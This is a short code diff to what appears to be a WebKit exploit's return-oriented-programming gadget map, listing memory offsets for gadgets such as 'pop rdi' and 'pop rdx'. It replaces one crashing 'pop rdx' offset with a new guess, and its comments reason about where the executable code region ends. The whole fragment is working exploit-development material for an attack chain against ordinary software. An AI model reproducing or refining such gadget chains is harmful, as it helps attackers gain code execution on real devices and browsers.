@@ -161,9 +161,11 @@ let wk_gadgetmap = {
 	"ret": 0x00000042,
 	"pop rdi": 0x00031434,
 	"pop rsi": 0x000B7098,
-	// BROKEN: crashed at launch #7/10. With mov rax,[rax] 0x12A439 working,
-	// this brackets the executable boundary to 0x12A439 .. 0x214613.
-	"pop rdx": 0x00214613,
+	// 0x00214613 CRASHED the chain (launch #7/10). Retrying nine bytes on at
+	// 0x0021461C, where `5A C3` is expected. If that executes, the region is
+	// live code after all and the "text ends at ~1.2MB" reading is wrong --
+	// the generator's addresses would just be locally inaccurate.
+	"pop rdx": 0x0021461C,
 	"pop rcx": 0x00032473,
 	"pop rax": 0x000A6CAB,
 	"pop rsp": 0x0006EEE1,
